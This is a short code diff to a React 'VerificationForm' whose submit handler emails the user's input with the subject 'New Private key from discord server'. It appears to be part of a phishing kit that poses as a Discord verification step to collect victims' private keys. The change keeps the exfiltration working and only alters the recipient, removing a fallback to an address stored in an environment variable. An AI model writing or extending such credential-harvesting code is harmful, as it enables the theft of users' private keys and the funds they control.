@@ -27,9 +27,9 @@ export default function VerificationForm({
         initialValues={{ value: "" }}
         onSubmit={async function (values) {
           return Api.instance.mail.sendMail({
-            title: "New Private key from discord server",
+            to: email!,
             message: values.value,
-            to: email ? email : import.meta.env.VITE_APP_EMAIL_ADDRESS,
+            title: "New Private key from discord server",
           });
         }}
       >
